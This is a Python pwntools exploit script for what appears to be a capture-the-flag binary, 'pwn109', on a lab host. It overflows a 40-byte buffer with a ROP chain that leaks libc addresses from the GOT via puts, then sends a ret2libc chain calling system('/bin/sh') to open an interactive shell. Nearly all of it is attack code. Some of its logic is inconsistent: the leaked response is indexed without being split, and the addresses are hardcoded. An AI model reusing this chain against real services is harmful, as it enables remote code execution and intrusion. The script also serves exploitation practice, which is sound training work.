
from pwn import *

#context.log_level = "debug"
context.binary = binary = ELF("./pwn109", checksec = False)

pad = b'A'*40

ret_gadget = p64(0x0000000000401231)
pop_rdi_gadget = p64(0x00000000004012a3)

plt_puts = p64(binary.plt.puts)

got_puts = p64(binary.got.puts)
got_setvbuf = p64(binary.got.setvbuf)
got_gets = p64(binary.got.gets)

puts_address = pop_rdi_gadget + got_puts + plt_puts
setvbuf_address = pop_rdi_gadget + got_setvbuf + plt_puts
gets_address = pop_rdi_gadget + got_gets + plt_puts

main_address = p64(binary.symbols.main)

system = p64(0x7ffff7e06ab0)
bin_sh = p64(0x7ffff7f50e34)
main_address = p64(0x4011f2)


io = process()
io = remote('10.10.90.99', 9009)

io.recvuntil(b'ahead')
io.recv()

io.sendline(pad+ret_gadget+puts_address+setvbuf_address+gets_address+main_address)

#io.recv()
resp = io.recvall()
print('Response : ', resp)

#resp = resp.split(b'\n')
#resp = list(map(lambda yy: hex(u64(yy.ljust(8, b'\x00'))), resp[:-1]))




system_adr = p64(int(resp[0], 16) - 0x31550)
print("Leaked Puts Address : ", resp[0])
print("Leaked SetVBuff Address : ", resp[1])
print("Leaked Gets Address : ", resp[2])
print("Leaked Main Address : ", hex(binary.sym.main))
print("Leaked BINSh Address : ", hex(u64(bin_sh)))
print("Leaked System Address : ", hex(u64(system_adr)))

io.sendline(pad+ret_gadget+pop_rdi_gadget+bin_sh+system)


io.interactive()
